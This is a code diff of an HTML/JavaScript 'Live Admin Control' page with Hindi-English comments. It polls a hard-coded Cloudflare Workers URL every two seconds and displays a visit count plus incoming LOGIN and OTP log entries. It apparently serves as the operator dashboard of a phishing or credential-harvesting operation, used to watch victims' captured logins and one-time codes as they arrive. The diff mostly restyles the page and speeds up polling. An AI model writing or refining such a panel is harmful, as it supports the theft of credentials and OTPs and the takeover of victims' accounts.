@@ -3,96 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Admin Panel - Live</title>
+    <title>Live Admin Control</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
-        body { background-color: #f0f2f5; padding-bottom: 50px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background-color: #f4f7f6; padding-bottom: 60px; }
 
-        /* Header */
+        /* Top Header - Yahan Count Badhega */
         .header {
-            background: #315195; color: white; padding: 15px 20px;
-            display: flex; justify-content: space-between; align-items: center;
-            position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            background: #315195;
+            color: white;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
         }
-        .header h1 { font-size: 18px; }
-        .v-badge { background: #ff9800; padding: 4px 12px; border-radius: 20px; font-weight: 800; font-size: 15px; }
+        .header h1 { font-size: 18px; font-weight: 700; letter-spacing: 0.5px; }
+        
+        /* Highlighting the Visit Count */
+        .visit-counter {
+            background: #ff9800;
+            color: #fff;
+            padding: 5px 15px;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: 900;
+            box-shadow: 0 0 10px rgba(255,152,0,0.5);
+            min-width: 50px;
+            text-align: center;
+        }
 
-        .container { padding: 12px; display: flex; flex-direction: column; gap: 10px; }
+        .container { padding: 12px; display: flex; flex-direction: column; gap: 12px; }
 
-        /* Card Design */
+        /* Vertical Colourful Cards */
         .card {
-            background: #fff; border-radius: 10px; padding: 15px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05); border-left: 6px solid #315195;
-        }
-        .card-top { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
-        .tag { font-size: 11px; font-weight: 800; color: #315195; text-transform: uppercase; }
-        .time { font-size: 10px; color: #999; }
-
-        /* Multi-line Data Detail */
-        .detail { 
-            font-size: 16px; color: #222; font-weight: 700; 
-            line-height: 1.6; white-space: pre-wrap; word-break: break-all;
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            border-left: 6px solid #315195;
+            animation: slideIn 0.3s ease-out;
         }
 
-        /* Color classes */
+        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
         .card-login { border-left-color: #28a745; background: #f1fff4; }
         .card-otp { border-left-color: #ff9800; background: #fffcf0; }
+        .card-visit { border-left-color: #315195; background: #f0f4ff; }
+
+        .card-top { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; padding-bottom: 6px; }
+        .tag { font-size: 11px; font-weight: 800; text-transform: uppercase; color: #444; }
+        .time { font-size: 10px; color: #aaa; }
+
+        /* Detail Formatting (Alag Alag Line) */
+        .detail-view {
+            font-size: 16px;
+            color: #111;
+            font-weight: 700;
+            line-height: 1.8;
+            white-space: pre-wrap; /* Line break ke liye */
+            word-break: break-all;
+        }
+
+        /* Bottom Status */
+        .footer-status {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background: #fff;
+            padding: 10px;
+            text-align: center;
+            font-size: 11px;
+            color: #666;
+            border-top: 1px solid #eee;
+        }
+        .dot { height: 8px; width: 8px; background: #28a745; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>DASHBOARD</h1>
-        <div class="v-badge" id="count">0</div>
+        <h1>LIVE ACTIVITY</h1>
+        <div class="visit-counter" id="vCount">0</div>
     </div>
 
-    <div class="container" id="box">
+    <div class="container" id="logsDisplay">
         </div>
+
+    <div class="footer-status">
+        <span class="dot"></span> Real-time Syncing (Every 2s)
+    </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        async function refresh() {
+        async function updateDashboard() {
             try {
                 const res = await fetch(workerURL);
-                const data = await res.json();
+                const logs = await res.json();
                 
-                const box = document.getElementById('box');
-                const badge = document.getElementById('count');
+                const display = document.getElementById('logsDisplay');
+                const vBadge = document.getElementById('vCount');
 
-                if (!data || data.length === 0) {
-                    box.innerHTML = "<p style='text-align:center;margin-top:50px;color:#999;'>No Logs Found</p>";
-                    badge.innerText = "0";
+                if (!logs || logs.length === 0) {
+                    display.innerHTML = "<p style='text-align:center; padding-top:50px; color:#999;'>No logs yet...</p>";
+                    vBadge.innerText = "0";
                     return;
                 }
 
-                // --- COUNT LOGIC (Simplified) ---
-                // Agar data list mein hai, toh uska length hi total count hai
-                badge.innerText = data.length; 
+                // 1. VISIT COUNT (Total rows)
+                vBadge.innerText = logs.length;
 
-                // Render Logs
-                box.innerHTML = data.map(log => {
-                    let typeClass = "";
-                    if(String(log.type).includes("LOGIN")) typeClass = "card-login";
-                    if(String(log.type).includes("OTP")) typeClass = "card-otp";
+                // 2. RENDER LOGS (Newest on Top)
+                display.innerHTML = logs.map(log => {
+                    let cardClass = "card-visit";
+                    const type = String(log.type).toUpperCase();
+                    
+                    if(type.includes("LOGIN")) cardClass = "card-login";
+                    if(type.includes("OTP")) cardClass = "card-otp";
 
                     return `
-                        <div class="card ${typeClass}">
+                        <div class="card ${cardClass}">
                             <div class="card-top">
                                 <span class="tag">${log.type}</span>
                                 <span class="time">${log.time}</span>
                             </div>
-                            <div class="detail">${log.detail}</div>
+                            <div class="detail-view">${log.detail}</div>
                         </div>
                     `;
                 }).join('');
 
-            } catch (e) { console.log("Syncing..."); }
+            } catch (e) {
+                console.log("Updating...");
+            }
         }
 
-        // Har 5 second mein update
-        setInterval(refresh, 5000);
-        window.onload = refresh;
+        // Fast Refresh: Har 2 second mein check karega
+        setInterval(updateDashboard, 2000);
+        window.onload = updateDashboard;
     </script>
 </body>
 </html>
